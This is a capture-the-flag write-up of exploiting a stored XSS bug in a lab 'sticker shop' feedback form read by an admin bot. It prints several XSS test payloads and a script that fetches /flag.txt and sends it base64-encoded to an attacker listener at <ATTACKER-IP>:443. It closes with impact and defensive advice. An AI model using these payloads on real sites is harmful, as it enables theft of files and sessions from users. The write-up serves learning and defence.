## Initial Enumeration

I started the assessment by reviewing the information provided in the room description.

<img width="755" height="306" alt="image" src="https://github.com/user-attachments/assets/f155c47b-5e90-4d59-8a9c-7f25e69aa115" />

We have the IP and the only clue "http://10.80.158.20:8080/flag.txt"

Accessing the provided URL directly returned a 401 Unauthorized response, indicating that the resource was protected.

<img width="498" height="216" alt="image" src="https://github.com/user-attachments/assets/f5dd1fc6-9c10-4540-8fa8-af3f100829d9" />

This suggests that direct access to /flag.txt is restricted and another attack vector is required.

Then, we delete /flag.txt in the URL, we got the kitty shop (sticker shop)

<img width="708" height="638" alt="image" src="https://github.com/user-attachments/assets/9dcde84b-0ae7-4717-b895-b005370dfbd8" />

Use gobuster to enumerate the ip, with a little lucky we can find hidden directories

<img width="559" height="309" alt="image" src="https://github.com/user-attachments/assets/17ca952c-ae60-405b-8d14-213d5735ea63" />

Although directory enumeration did not reveal anything directly useful, it helped confirm that no obvious hidden endpoints were exposed.

While gobuster ir running, we go to check aroung the page 

In the source code find the diretory /static, that's where the images are stored 

<img width="747" height="299" alt="image" src="https://github.com/user-attachments/assets/2e84cec9-b9be-448b-8d35-c5943216c10a" />

If we use curl in the terminal, we get the error 401 again

<img width="382" height="115" alt="image" src="https://github.com/user-attachments/assets/eb15c71d-beb4-4145-a968-b97c0d56ae02" />

I try to change the method GET to POST

<img width="477" height="182" alt="image" src="https://github.com/user-attachments/assets/30932aa5-b660-4346-ae5d-e1afdd407b1f" />

The server responded with "405 Method Not Allowed" when attempting a POST request

<img width="491" height="293" alt="image" src="https://github.com/user-attachments/assets/30d4e5ae-6648-43a1-9fcd-625b9fff75a5" />

By adding the -i flag in curl, the response headers revealed the allowed HTTP methods:

- OPTIONS
- HEAD
- GET
This indicates that the endpoint only supports read-based interactions.

Then, we use the HEAD method

<img width="486" height="227" alt="image" src="https://github.com/user-attachments/assets/59bf42df-0034-4bd2-8d79-25770e778b94" />

But, we don't get anything again

Further testing was required

Looking around the page, there is a nother page, the feedback

<img width="639" height="372" alt="image" src="https://github.com/user-attachments/assets/6244947c-71fe-41a0-80d0-cdcbfffce97b" />

We send a "feedback" for test

<img width="222" height="131" alt="image" src="https://github.com/user-attachments/assets/57248baa-2b42-4229-a5d2-dcf94feddefb" />
<img width="582" height="146" alt="image" src="https://github.com/user-attachments/assets/72038989-8280-40e8-8bdf-044558258208" />

We have success to send the test message

But, where to went?

At this stage, I began testing for Cross-Site Scripting (XSS) vulnerabilities in the feedback form.

Initial payloads such as:

"<script>alert(1)</script>"

<img width="370" height="196" alt="image" src="https://github.com/user-attachments/assets/fc0b36b5-9af7-43ef-a94c-767e8d176182" />

did not execute, suggesting possible filtering or output encoding

<img width="609" height="394" alt="image" src="https://github.com/user-attachments/assets/28b1ca66-566e-4b91-b313-ff911c6e4202" />

Maybe there's a filter
We can try it again, now use: "><script>alert('SeraByte');</script>

<img width="375" height="123" alt="image" src="https://github.com/user-attachments/assets/eb3455dc-7443-49c2-890c-d1b952966437" />

But we don't get anything again, 

Checking the source code, we don't get a clue that help us to resolve it 

<img width="759" height="136" alt="image" src="https://github.com/user-attachments/assets/79ae8e8f-d4c4-47f7-8b4d-b22256eb955c" />

We can try a XSS with the textarea, </textarea><script>alert('SeraByte');</script>

<img width="362" height="125" alt="image" src="https://github.com/user-attachments/assets/6b0ef981-baeb-4005-82b5-d16aeecf268c" />

  &lt img src=x onerror=alert(1)>
  ">&ltimg src=x onerror=alert(1)>

What happend if we try a reverse shell? 
We run a listener 

<img width="244" height="80" alt="image" src="https://github.com/user-attachments/assets/6d0827f8-1297-436d-9f28-aea02f3b3693" />


 We use the next script: "<img src="http://<IP>:443/test">"

<img width="310" height="104" alt="image" src="https://github.com/user-attachments/assets/83aaa2aa-1183-4828-847c-64df5485c842" />

This confirmed the presence of a stored XSS vulnerability and suggested that an automated review bot was processing submitted feedback messages.

<img width="441" height="221" alt="image" src="https://github.com/user-attachments/assets/f85b7107-4d27-4805-99a7-e9230b188f8b" />

After submitting test payloads, I noticed that while no alert executed in my browser, the server interacted with my external listener when an image payload was submitted.
Now we are sure that it's a stored XSS, and there's a bot checking for the messages
We need a script to do the bot get us the flag

To exploit the stored XSS, I crafted a payload to retrieve the protected resource:

"<script>
fetch('/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://<ATTACKER-IP>:443/?flag=' + btoa(data))
  });
</script>

Explanation:

- fetch('/flag.txt') requests the protected file from the server.
- response.text() converts the response into plaintext.
- btoa(data) encodes the content in Base64 to ensure safe transmission.
- The second fetch() sends the encoded data to my listener.


We start the listener, and submit the script 

<img width="317" height="107" alt="image" src="https://github.com/user-attachments/assets/46f392e3-6fc8-4632-ba3b-2f946c6e4458" />

The flag was successfully exfiltrated

<img width="653" height="199" alt="image" src="https://github.com/user-attachments/assets/178dc705-6ab4-469f-b1a1-daf9eb2dbf13" />

But it's in base64, that not problem, we can decode it 
Using a simple command, like "echo <string-base64> | base64 -d" we can get the flag in plaintext

<img width="675" height="84" alt="image" src="https://github.com/user-attachments/assets/0014af9e-0555-46a3-b405-826a52d1d922" />


## Security Impact

This vulnerability demonstrates how a stored XSS combined with an automated admin bot can result in unauthorized data access and sensitive information disclosure.

An attacker could leverage this to:
- Steal sensitive files
- Hijack authenticated sessions
- Perform actions on behalf of privileged users

## Defensive Recommendations

- Implement proper output encoding to prevent HTML injection.
- Use a strict Content Security Policy (CSP).
- Sanitize and validate user input.
- Avoid rendering unsanitized user-controlled HTML.
- Isolate automated review bots in restricted environments.
